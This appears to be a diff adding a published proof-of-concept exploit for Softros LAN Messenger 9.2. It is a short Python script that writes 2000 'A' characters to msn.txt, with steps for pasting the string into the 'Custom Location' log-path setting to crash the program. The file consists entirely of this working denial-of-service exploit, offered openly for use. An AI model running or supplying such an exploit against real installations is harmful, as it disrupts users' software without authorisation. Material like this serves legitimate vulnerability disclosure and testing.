@@ -1,0 +1,23 @@
+# Exploit Title: Softros LAN Messenger 9.2 - Denial of Service (PoC)
+# Discovery by: Victor Mondragón
+# Discovery Date: 2018-11-02
+# Vendor Homepage: https://messenger.softros.com/
+# Software Link: https://messenger.softros.com/downloads/
+# Tested Version: 9.2
+# Tested on: Windows 10 Single Language x64 / Windows 7 x64 Service Pack 1
+
+# Steps to produce the crash:
+# 1.- Run python code: Softros_LAN_Messenger_v9.2.py
+# 2.- Open msn.txt and copy content to clipboard
+# 2.- Open Softros LAN Messenger
+# 3.- Select "Logging"
+#  4.- Locate "Log Files Location " 
+# 5.- Select "Custom Location" and Paste ClipBoard
+# 6.- Click on "OK"
+# 7.- Crashed
+
+cod = "\x41" * 2000
+
+f = open('msn.txt', 'w')
+f.write(cod)
+f.close()
